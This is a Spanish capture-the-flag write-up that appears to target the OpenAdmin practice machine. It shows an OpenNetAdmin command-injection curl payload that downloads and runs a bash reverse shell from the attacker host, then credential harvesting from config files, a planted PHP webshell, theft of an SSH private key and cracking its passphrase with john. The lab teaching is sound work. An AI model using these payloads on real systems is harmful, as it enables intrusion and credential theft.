## Vuln exploit & Gaining Access {-}

### Ganando accesso con curl al opennetadmin {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Creamos un fichero index.html con codigo bash

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.8/443 0>&1
    ```

1. Creamos un servidor web con python

    ```bash
    python -m http.server 80
    ```

1. Lanzamos el curl con reverseshell

    ```bash
    curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";curl 10.10.14.8|bash;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
    ```

Ya hemos ganado accesso al systema.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### User Pivoting {-}

```bash
ls
grep -r -i -E "user|pass|key|database"
grep -r -i -E "user|pass"
cd /home
find \-name user.txt 2>/dev/null
find \-name user.txt
id
sudo -l
cd /var/www
ls -la
cd internal
cd /opt/ona/www
ls
find \-type f 2>/dev/null | grep "config"
```

Aqui no hemos podido entrar en los directorios de los usuarios, y en el directorio internal del `/var/www`. Hemos visto
quel directorio `/var/www/ona` era un link symbolico a `/opt/ona/www` y buscando por archivos conteniendo config en su nombre,
hemos caido en un fichero `database_settings.inc.php` que contiene credenciales.

```bash
grep "sh$" /etc/passwd
su jimmy
Password: 
```

Hemos podido conectarnos como el usuario **jimmy** pero la flag no esta en su directorio de usuario. Parece que tenemos que convertirnos
en el usuario **joanna**.

```bash
id
```

Aqui vemos quel usuario es parte del grupo **internal**. Miramos lo que hay en el directorio `/var/www/internal`

```bash
cd /var/www/internal
ls -la
cat main.php
```

Vemos que en la web de internal se podria ver el id_rsa de joanna. Miramos la configuracion de esta web

```bash
cd /etc/apache2/sites-available
cat internal.conf
```

Aqui vemos que hay una web montada en local por el puerto 52846. Lo mas interesante aqui es quel usuario joanna a sido asignada
como AssignUserID de este servicio. Intentamos comprometer este servicio, directamente desde la maquina victima.

```bash
cd /var/www/internal
curl localhost:52846
```

Aqui vemos que podemos acceder a la web internal.

1. creamos un nuevo fichero s4vishell.php

    ```php
    <?php
        system("whoami");
    ?>
    ```

1. lanzamos una peticion get a este fichero

    ```bash
    curl localhost:52846/s4vishell.php
    #Output
    joanna
    ```

En el fichero `main.php` vemos que hace un echo de la id_rsa de joanna. Lo miramos con curl

```bash
curl localhost:52846/main.php
```

copiamos la key en un fichero joanna_rsa en nuestra maquina de ataquante y nos connectamos con ssh

```bash
chmod 600 joanna_rsa
ssh joana@10.10.10.171 -i joanna_rsa
```

Aqui vemos que la id_rsa esta protegida por una contraseña. Crackeamos la llave.

#### Crackeamos la id_rsa con ssh2john {-}

```bash
/usr/share/john/ssh2john.py joanna_rsa > hash
john --wordlists=/usr/share/wordlists/rockyou.txt hash
```

Aqui ya tenemos la contraseña de la id_rsa de joanna y nos podemos conectar

```bash
ssh -i joanna_rsa joanna@10.10.10.171
Enter passphrase
```

y ya podemos leer la flag.

